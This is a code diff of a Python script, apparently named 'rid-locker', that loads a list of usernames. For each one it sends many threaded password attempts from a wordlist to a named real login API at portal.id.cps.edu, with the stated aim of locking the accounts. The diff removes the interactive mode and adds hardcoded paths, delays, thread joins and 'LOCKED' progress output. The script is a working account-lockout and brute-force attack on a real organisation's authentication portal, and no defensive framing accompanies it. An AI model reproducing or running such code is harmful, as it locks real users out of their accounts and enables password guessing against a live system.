@@ -7,46 +7,40 @@ from itertools import islice
 import time
 import sys
 
-interactive_mode = '--interactive-mode' in sys.argv
+print("LOCKING ACCOUNTS IN 5 SECONDS")
+print("PRESS CTRL+C TO CANCEL\n")
+time.sleep(5)
 
-#Interactive mode - get variables
-if interactive_mode:
-    name_file = open(input("Name list file: "))
-    thread_count = int(input("Thread count: "))
-    words_per_thread = int(input("Words per thread: "))
-    name_list = name_file.read().splitlines()
-
-    print("Accounts to be locked:")
-
-    for username in [x for x in name_list if not x.startswith('#')]:
-        print(username)
-
-    print("Locking in 10 seconds, press Ctrl+C to cancel")
-    time.sleep(10)
-    print("Initializing threads...")
-    time.sleep(2)
-
-#Automatic mode - use build-in variables
-else:
-    name_file = open("/mnt/data/rid-locker/account_list")
-    name_list = name_file.read().splitlines()
-    thread_count = 100
-    words_per_thread = 100
-
-name_list_parsed = [x for x in name_list if not x.startswith('#')]
-
-#Set static variables
+#Portal API URL
 api_url = "https://portal.id.cps.edu/api/rest/authn"
+#Username list file
+name_file = open("/mnt/data/rid-locker/account_list")
+name_list = name_file.read().splitlines()
+name_list_parsed = [x for x in name_list if not x.startswith('#')]
+#Thread settings
+thread_count = 10
+words_per_thread = 10
+#Wordlist file
 wordlist = '/mnt/data/rid-locker/all_in_one_w'
+#TIme to wait between each account (IN seconds)
+delay_time = 1
 
-#Iterate through usernames in list
 for username in name_list_parsed:
+    log_username = username.ljust(20)
+    sys.stdout.write("{} : WAITING\r".format(log_username))
+    time.sleep(delay_time)
+    sys.stdout.write("{} : LOCKING\r".format(log_username))
     with open(wordlist) as f:
+        thread_list = []
         for i in range(0,thread_count):
             #Split list of words into slices for multi-threaded processing
             next_n_lines = list(islice(f, words_per_thread))
             #Stop if no more words to avoid exception
             if not next_n_lines:
                 break
-            Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines)).start()
-    time.sleep(60)
+            temp_thread = Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines))
+            temp_thread.start()
+            thread_list.append(temp_thread)
+        for thread in thread_list:
+            thread.join()
+        sys.stdout.write("{} : LOCKED \r\n".format(log_username))
